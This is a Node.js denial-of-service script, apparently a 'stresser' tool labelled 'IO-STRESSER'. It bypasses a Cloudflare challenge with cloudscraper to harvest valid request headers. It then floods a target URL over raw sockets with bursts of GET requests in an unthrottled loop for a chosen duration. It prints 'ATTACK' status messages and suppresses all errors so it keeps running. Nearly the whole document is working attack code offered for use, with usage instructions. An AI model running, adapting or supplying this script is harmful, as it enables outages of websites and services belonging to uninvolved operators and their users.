    require('events').EventEmitter.defaultMaxListeners = 0
    const CloudScraper = require('cloudscraper'),
    request = require('request')
        path = require('path'),
        url = require('url');

    if (process.argv.length !== 5) {
        console.log(`    
                            < CREATE BY IO-STRESSER >
            Usage Raw: node onsreqbot.js <url> <time> <req_per_ip(1700 in google cloud)>
    `);
        process.exit(0);
    }

    const target = process.argv[2],
        time = process.argv[3],
        req_per_ip = process.argv[4],
        host = url.parse(target).host;

    let getHeaders = function () {
        return new Promise(function (resolve, reject) {
            CloudScraper.get({
                uri: target,
                resolveWithFullResponse: true,
                challengesToSolve: 1
            }, function (error, response) {
                if (error) {
                    console.log(`ERROR ATTACK`);
                    return start();
                }
                let headers = '' ;
                Object.keys(response.request.headers).forEach(function (i, e) {
                    if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
                        return;
                    }
                    headers += i + ': '  + response.request.headers[i] + '\r\n';
                });

                console.log(headers);
                resolve(headers);
            });
        });
    }
    function send_req(headers) {
        const net = require('net'),
            client = new net.Socket();

        client.connect(80, host);
        client.setTimeout(10000);

        for (let i = 0; i < req_per_ip; ++i) {
            client.write(
                `GET ${target} HTTP/1.2\r\n` +
                headers + '\r\n'
            )
        }

        client.on('data', function () {
            setTimeout(function () {
                client.destroy();
                return delete client;
            }, 5000);
        });
    }

        let init = function () {
            getHeaders().then(function (result) {
                console.log(`
                    ATTACKED REQUEST RAW
                `);
                setInterval(() => {
                    send_req(result);
                });
            });
        };

    setTimeout(() => {
        console.log(`
                    END ATTACK
        `);
        process.exit(0)
    }, time * 1000);

    init();

    // to avoid errors
    process.on('uncaughtException', function (err) {
    });
    process.on('unhandledRejection', function (err) {
    });